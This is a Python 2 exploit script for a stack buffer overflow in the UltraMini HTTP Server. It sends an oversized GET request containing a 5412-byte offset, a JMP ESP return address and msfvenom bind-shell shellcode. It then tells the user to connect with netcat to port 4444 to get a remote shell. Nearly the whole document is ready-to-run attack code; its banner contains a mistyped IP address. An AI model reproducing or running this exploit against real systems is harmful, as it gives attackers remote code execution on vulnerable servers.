#!/usr/bin/python

import socket
import sys
import struct

banner = """
#----------------------------------------------#
UltraMini HTTP Server Exploit with Shellcode
1. python ultramini_http_server_sc.py
2. nc -v 17216.73.129 4444
3. RECEIVE SHELL
#----------------------------------------------#
"""

print banner
#msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LHOST=172.16.73.129 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f c
shellcode = ("\xb8\x22\xed\x67\xaa\xdb\xc6\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x53\x83\xc3\x04\x31\x43\x0e\x03\x61\xe3\x85\x5f\x99\x13\xcb"
"\xa0\x61\xe4\xac\x29\x84\xd5\xec\x4e\xcd\x46\xdd\x05\x83\x6a"
"\x96\x48\x37\xf8\xda\x44\x38\x49\x50\xb3\x77\x4a\xc9\x87\x16"
"\xc8\x10\xd4\xf8\xf1\xda\x29\xf9\x36\x06\xc3\xab\xef\x4c\x76"
"\x5b\x9b\x19\x4b\xd0\xd7\x8c\xcb\x05\xaf\xaf\xfa\x98\xbb\xe9"
"\xdc\x1b\x6f\x82\x54\x03\x6c\xaf\x2f\xb8\x46\x5b\xae\x68\x97"
"\xa4\x1d\x55\x17\x57\x5f\x92\x90\x88\x2a\xea\xe2\x35\x2d\x29"
"\x98\xe1\xb8\xa9\x3a\x61\x1a\x15\xba\xa6\xfd\xde\xb0\x03\x89"
"\xb8\xd4\x92\x5e\xb3\xe1\x1f\x61\x13\x60\x5b\x46\xb7\x28\x3f"
"\xe7\xee\x94\xee\x18\xf0\x76\x4e\xbd\x7b\x9a\x9b\xcc\x26\xf3"
"\x68\xfd\xd8\x03\xe7\x76\xab\x31\xa8\x2c\x23\x7a\x21\xeb\xb4"
"\x7d\x18\x4b\x2a\x80\xa3\xac\x63\x47\xf7\xfc\x1b\x6e\x78\x97"
"\xdb\x8f\xad\x02\xd3\x36\x1e\x31\x1e\x88\xce\xf5\xb0\x61\x05"
"\xfa\xef\x92\x26\xd0\x98\x3b\xdb\xdb\xb7\xe7\x52\x3d\xdd\x07"
"\x33\x95\x49\xea\x60\x2e\xee\x15\x43\x06\x98\x5e\x85\x91\xa7"
"\x5e\x83\xb5\x3f\xd5\xc0\x01\x5e\xea\xcc\x21\x37\x7d\x9a\xa3"
"\x7a\x1f\x9b\xe9\xec\xbc\x0e\x76\xec\xcb\x32\x21\xbb\x9c\x85"
"\x38\x29\x31\xbf\x92\x4f\xc8\x59\xdc\xcb\x17\x9a\xe3\xd2\xda"
"\xa6\xc7\xc4\x22\x26\x4c\xb0\xfa\x71\x1a\x6e\xbd\x2b\xec\xd8"
"\x17\x87\xa6\x8c\xee\xeb\x78\xca\xee\x21\x0f\x32\x5e\x9c\x56"
"\x4d\x6f\x48\x5f\x36\x8d\xe8\xa0\xed\x15\x18\xeb\xaf\x3c\xb1"
"\xb2\x3a\x7d\xdc\x44\x91\x42\xd9\xc6\x13\x3b\x1e\xd6\x56\x3e"
"\x5a\x50\x8b\x32\xf3\x35\xab\xe1\xf4\x1f")

#EIP = 79473479 -> offset at 5412
offset = 'A'*5412

#JMP ESP = !mona jmp -r esp -> 0x7e429353 or \x53\x93\x42\x7e
nowjump = '\x53\x93\x42\x7e'

bufferandshellcode = '\x90' * 192 + shellcode

sploit = offset + nowjump + bufferandshellcode + "\x90"*(5500-len(offset + nowjump + bufferandshellcode))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "\nDestroy them with lazers..."
s.connect(('172.16.73.129',80))
s.send('GET ' + sploit + ' HTTP/1.1\r\n\r\n')
s.close
print "\nFire in the hole! Go pick up the pieces!"

